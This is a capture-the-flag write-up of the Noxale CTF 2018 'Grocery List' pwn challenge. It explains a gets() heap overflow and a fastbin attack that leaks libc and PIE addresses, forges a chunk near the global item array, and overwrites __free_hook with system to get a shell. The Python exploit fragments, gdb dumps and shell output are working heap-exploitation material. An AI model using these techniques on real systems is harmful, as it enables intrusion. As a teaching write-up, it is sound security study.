+++
title = "Noxale CTF: Grocery List (pwn)"
date = "2018-09-09T19:21:10+01:00"
tags = ["writeup", "ctf", "pwn", "rop", "heap"]
categories = ["writeup", "pwn"]
comments = true
highlight = true
draft = false
index = true
+++

In this challenge we are given a service IP and PORT, to which we can connect using `netcat` or any similar tool. 
We are also provided with an `ELF` file.

<!--more-->

The task description is the following:

> I really hate it when I forget what I wanted to buy.

> That's why I created the FASTEST Grocery List in the world.

> Go check it out.

> nc chal.noxale.com 1232
> [Challenge files](/ctf-files/34c3-ctf-2017/noxale-ctf-2018/GroceryList)


{{< tweet 1038879867725651968 >}}




The file is a 64 bits Linux executable with all protections enabled:

```shell
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

To get a feeling what the binary is doing, I played with it a little bit.

```
What would you like to do?
1. Print the list
2. Add item to the list
3. Add empty items to the list
4. Remove an item from the list
5. Edit an existing item
6. Add default example
7. Exit
2
What is the size of your item?
1. Small
2. Medium
3. Large
1
Enter your item`s name:
Test
What would you like to do?
1. Print the list
2. Add item to the list
3. Add empty items to the list
4. Remove an item from the list
5. Edit an existing item
6. Add default example
7. Exit
```

The binary allows us to create/edit/delete and batch create items. Reversing the main loop using `IDA` the code looks like: 

```C
int choice;
char def_item[12] = "Grocery Item";
do {
  puts_("What would you like to do?");
  puts_("1. Print the list");
  puts_("2. Add item to the list");
  puts_("3. Add empty items to the list");
  puts_("4. Remove an item from the list");
  puts_("5. Edit an existing item");
  puts_("6. Add default example");
  puts_("7. Exit");
  fflush(stdin);
  scanf("%d", &choice);
  switch ( choice ) {
    case 1:
      dump_items();
      break;
    case 2:
      add_item();
      break;
    case 3:
      add_empty_items();
      break;
    case 4:
      delete_item();
      break;
    case 5:
      edit_item();
      break;
    case 6:
      add_default_item(def_item);
      break;
    case 7:
      puts_("Goodbye\n");
      free_all();
      break;
    default:
      puts("Invalid choice");
      break;
  }
} while ( choice != 7 );
```

At maximun we can only have 20 items, which are `malloc`'ed and stored in a global array that resides within the `.bss` segment of the binary.

There is 3 types of items: `small = 0x10`, `medium = 0x38`, and `large = 0x60`.

We notice that all the sizes are within the `fastbin` size range, so we will be dealing with fastbin chunks only. Now we understand why the word **FASTEST** was in bold in the challenge description ;).

Content reading is done using `gets`, which is known to be unsecure, because it doens't do any bound check. This allows us to write out of the malloc'ed item  chunks and thus overwriting stuff.


# Fastbin Attack

Based on the information we have, and what we can do, we can see that this is a typical fastbin attack, where we need to overwrite a free chunk **FD** pointer by a fake one that we can use to achieve an arbitrary read/write.

But since `PIE` and `ASLR` are enabled, we need to defeat them first by leaking some addresses.

We know that `smallbins` will have a pointer to `main_arena` in their **FD** and **BK** pointers once free'ed, so if we manage to craft a fake `smallbin`, free it and then create a new empty item, the item will be located in the same region as the previously free'ed fake smallbin, so by printing the item we would have leaked a `libc` address. To do so, we can overwrite into a chunk metadata to corrupt it's `size` field and make it looks like a `smallbin`.

The function I used to do the leak looks as follow:

```python
def getheapleak():
    add_item(1, "AAAAAAA")
    add_item(3, "AAAAAAA")
    add_item(3, "AAAAAAA")
    add_item(1, "AAAAAAA")

    fake_chunk = "A"*24 + p64(0xe1)
    edit_item(0, fake_chunk)

    delete_item(1)

    add_empty_items(2, 1)

    r.sendline("1")
    r.recvuntil("3. ")

    leak = r.recvline(keepends=False)
    leak = leak + ("\x00" * (8 - len(leak)))
    r.recvuntil("Exit\n")

    return u64(leak)
```

With the leaked address we can locate `libc` base address and the binary `PIE` base. Thus defeating both `ASLR` and `PIE`.

The next step is to free an item so that the `fastbin` list get populated and then overwrite the free'ed item (by editing the previous one) **FD** pointer by a fake chunk.

```python
add_empty_items(1, 4)
delete_item(7)
```

Now our fastbin contains this: 

```
0x20: 0x5555557584e0 ◂— 0x0 # the just free'ed item
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

Since **FD** needs to point to a valid fastbin chunk that have the size 0x20, this will put some limitations to what we can write, the validation check done by `libc` is as follow:

- if a chunk `A` is in fastbin list of size `X`, then `A->size >> 4 - 2` needs to be equal to `X`

This looks like a hard condition to fulfill, but it's pretty easy to find such a valid fake chunk. Since the `size` field is at offset `8` of the struct, we need to find an address `A` such as the data at `A + 8` contains a valid chunk size.

powered by `gdb` I did found a valid address that fullfill that condition. And guess what? it's only 3 bytes far from the global `items_list` array

```
pwndbg> x/5gx 0x55555575602d
0x55555575602d:	0xaaab0978e0000000	0x000000000000002a
0x55555575603d:	0x5555758430000000	0x55557584c0000055
0x55555575604d:	0x5555758530000055
pwndbg> x/10gx 0x5555557584c0 
0x5555557584c0:	0x0041414141414141	0x0000000000000021 <- item 6
0x5555557584d0:	0x00002aaaab097b78	0x00002aaaab097b78
0x5555557584e0:	0x0000000000000000	0x0000000000000021 <- item 7 (0x5555557584f0 is what we want to corrupt)
0x5555557584f0:	0x0000000000000000	0x00002aaaab097ba8
0x555555758500:	0x0000000000000000	0x0000000000000021
```

With that we can edit the 6'th item to corrupt the **FD** of the 7th item.

```python
fake_fast_chunk = pie_base + 0x20202d
payload = "B" * 16          # Fill current chunk
payload += p64(0)           # Prev size
payload += p64(0x21)        # Chunk size (keep the old one)
payload += p64(fake_fast_chunk)  # FD pointer
edit_item(6, payload)
```

```
pwndbg> fastbins
0x20: 0x5555557584e0 —▸ 0x55555575602d (our fake chunk) ◂— 0x5555758430000000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> x/10gx 0x5555557584c0
0x5555557584c0:	0x0000000000000000	0x0000000000000021 <- item 6
0x5555557584d0:	0x4242424242424242	0x4242424242424242
0x5555557584e0:	0x0000000000000000	0x0000000000000021 <- item 7
0x5555557584f0:	0x000055555575602d	0x00002aaaab097b00
0x555555758500:	0x0000000000000000	0x0000000000000021
```

Now if we allocate 2 new items (small size), the second one will be at our fake chunk. Since our fake chunk is 3 bytes before the global `items_list` array, by editing it we will place fake addresses in the `items_list`.

We will use that to insert fake items address into the `items_list`, and thus have arbitrary read/write since we can print and edit items.

We cannot edit a [GOT](https://en.wikipedia.org/wiki/Global_Offset_Table) entry since the binary is `Full RELRO`, so the plan was to overwrite the pointer `__free_hook` with the address of `system`, which will make any call to `free(SOMETHING)` also calls `system(SOMETHING)`.

To do this we need to have `system` and `__free_hook` addresses. By leaking the addresses of two different `libc` functions we can know what `libc` version is being used and thus calculate the addresses of both `system` and `__free_hook`, I went for leaking the addresses of `puts` and `getchar`


```python
overwrite = "PAD"
overwrite += p64(pie_base + e.got['puts'])    # items[0]
overwrite += p64(pie_base + e.got['getchar'])  # items[1]
edit_item(8, overwrite)
r.sendline("1")
r.recvuntil("0. ")
leak = r.recvline(keepends=False)
puts = u64(leak.ljust(8, "\x00"))
r.recvuntil("1. ")
leak = r.recvline(keepends=False)
getchar = u64(leak.ljust(8, "\x00"))
```

Running it we get:

```shell
> $ python exploit.py
[*] '/MacOsHome/Desktop/CTFs/noxale-2018/grocery_list/GroceryList'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './GroceryList': pid 4407
[!] ASLR is disabled!
[4407]
[*] Heap leak : 0x2aaaab097c48
[*] PIE Base  : 0x555555554000
[*] LIBC base : 0x2aaaaacd3000
[*] items bss : 0x555555756040
[*] Fake Fast chunk: 0x55555575602d
[*] puts    : 0x2aaaaad42690
[*] getchar : 0x2aaaaad49160
```

Using [libc_search](https://libc.blukat.me/) we now know that the libc being used is 2.23-ubuntu, and that the offsets of `system` and `__free_hook` are `0x45390` and `0x3c67a8` respectively. 

Now we just need to place `__free_hook` in `items[0]` using the same trick as before, and edit it to write the address of `system`.


The following python code is the final exploit. I'm using [Pwntools](https://github.com/Gallopsled/pwntools) to do this, since it makes network programming much more easy and funny.


{{< gist segflow a7142d7e3b866c3577ab8a08ea0c3b9c >}}


```shell
> $ python exploit.py
[*] '/MacOsHome/Desktop/CTFs/noxale-2018/grocery_list/GroceryList'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './GroceryList': pid 4407
[!] ASLR is disabled!
[4407]
[*] Heap leak : 0x2aaaab097c48
[*] PIE Base  : 0x555555554000
[*] LIBC base : 0x2aaaaacd3000
[*] items bss : 0x555555756040
[*] Fake Fast chunk: 0x55555575602d
[*] puts    : 0x2aaaaad42690
[*] getchar : 0x2aaaaad49160
[*] system : 0x2aaaaad18390
[*] __free_hook : 0x2aaaab0997a8
[*] Switching to interactive mode
Which item would you like to remove?
$ uname -a
Linux pwnbox 4.9.87-linuxkit-aufs #1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```